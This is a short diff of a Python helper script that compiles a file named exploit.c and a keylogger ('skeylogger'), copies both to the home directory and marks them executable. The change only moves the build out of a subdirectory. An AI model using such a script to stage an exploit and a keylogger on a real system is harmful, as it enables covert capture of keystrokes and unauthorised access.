@@ -5,12 +5,12 @@ def r(command):
 
 def main():
 	# Compilation
-	r("make -C simple-key-logger/")
+	r("make")
 	r("gcc exploit.c")
 	
 	# Move compiled files to home
 	r("cp a.out ~")
-	r("cp simple-key-logger/skeylogger ~")
+	r("cp skeylogger ~")
 	
 	# Give exec permissions to both files
 	r("chmod +x ~/a.out")
